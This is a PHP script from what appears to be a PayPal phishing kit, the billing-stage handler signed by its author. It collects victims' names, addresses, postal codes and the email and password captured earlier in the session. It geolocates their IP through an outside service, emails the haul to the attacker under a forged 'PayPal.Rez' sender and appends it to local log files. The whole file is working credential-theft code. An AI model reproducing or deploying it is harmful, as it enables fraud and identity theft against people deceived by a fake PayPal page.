<?php
#####################################################################################################
###################################### fallagmahdi@hotmail.com ######################################
###### ####### ##      ##      #######  #######       #### #### ####### ##     ##   ######   ########
##     ##   ## ##      ##      ##   ## ##             ## ### ## ##   ## ##     ##   ##    ##    ##
###### ####### ##      ##      ####### ##  ######     ##  #  ## ####### #########   ##     ##   ##
##     ##   ## ##      ##      ##   ## ##    ##       ##     ## ##   ## ##     ##   ##    ##    ##
##     ##   ## ####### ####### ##   ##  #######       ##     ## ##   ## ##     ##   ######   ########
############################## https://www.facebook.com/fallag.mahdi.tn #############################
#####################################################################################################
session_start();
include("inc/config.php");
date_default_timezone_set("Africa/Tunis");
$rand = $_GET['dispatch'];
$ip = getenv("REMOTE_ADDR");
$ch = curl_init('http://api.hostip.info/get_json.php?ip='.$ip);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$output = curl_exec($ch);
$obj = json_decode($output);
if($obj->{'country_name'} == "(Unknown Country?)"){
	$con = "XXXXXXX";
} else {
	$con = $obj->{'country_name'};
}
if($obj->{'city'} == "(Unknown City?)"){
	$cit = "XXXXXXX";
} else {
	$cit = $obj->{'city'};
}
$_SESSION['Done'] = 2;
$hostname = gethostbyaddr($ip);
$userag = $_SERVER['HTTP_USER_AGENT']; 
$date = date('d-m-Y', time());
$time = date('H:i:s', time());
$adr = "<b>".$_POST['ST']."</b> || Line 2 = <b>".$_POST['AL']."</b>"; 
$_SESSION['fullname'] = $_POST['FN']." ".$_POST['LN'];
$_SESSION['street1'] = $adr;
$_SESSION['city'] = $_POST['CT'];
$_SESSION['state'] = $_POST['SA'];
$_SESSION['postalCode'] = $_POST['ZP'];
$_SESSION['country'] = $_POST['CN'];
$msg =  "<div style='font-size:13px;font-family:monospace'>";
$msg .= "<b>------------------+| SPAM ATTACK (2015) |+------------</b><br><br>";
$msg .= "MAIL = <b>".$_SESSION['email']."</b><br>";
$msg .= "PASS = <b>".$_SESSION['pass']."</b><br>";
$msg .= "NAME = <b>".$_POST['FN']." || Last = ".$_POST['LN']." </b><br>";
$msg .= "ADRS = ".$adr."<br>";
$msg .= "CITY = <b>".$_POST['CT']."</b><br>";
$msg .= "STAT = <b>".$_POST['ZP']."</b><br>";
$msg .= "OZIP = <b>".$_POST['SA']."</b><br>";
$msg .= "CNTR = <b>".$_POST['CN']."</b><br>";
$msg .= "<b><br>------------------+| Automated Information <i>(By IP)</i> |+------------</b> <br><br>";
$msg .= "CNTR = <b>".$con."</b> <IMG SRC='http://api.hostip.info/flag.php?ip=".$ip."' style='width: 26px;' ><br>\n";
$msg .= "CITY = <b>".$cit."</b><br>\n";
$msg .= "OOIP = <a href='http://www.geoiptool.com/?IP=$ip' target='_blank'>$ip (Click for more information)</a><br>";
$msg .= "TIME = <b>".$time."</b><br>\n";
$msg .= "DATE = <b>".$date."</b><br>\n";
$msg .= "USER = <b>".$userag."</b><br>\n";
$msg .= "<b><br>------------------+| Fallag MàhDi |+------------ </b><br>";
$msg .= "<b><br>------------------+| Happy Shop :) |+------------ </b></div><br>";
$msg = wordwrap($msg,70);
$sub = "FG MD > PayPal Billing | $ip | ".$_SESSION['email'];
$head = "MIME-Version: 1.0" . "\r\n";
$head .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$head .= "From: PayPal.Rez" . "\r\n";
if($m2 == 1) {
	$myFile = "../rezmdf.html";
	$fh = @fopen($myFile, 'a+') or die("can't open file");
	@fwrite($fh, $msg);
	@fclose($fh);
}
mail($to,$sub,$msg,$head);
$msg = "<b>".$_SESSION['email']." </b> with <b>$ip</b> has finished from <b>Personal</b> at <b>$time - $date</b>, Check your email for billing<br>";
$myFile = "../ips.html";
$fh = fopen($myFile, 'a+') or die("can't open file");
fwrite($fh, $msg);
fclose($fh);
$css = css_while();
$html = html_while_2($css, "");
die($html);

?>
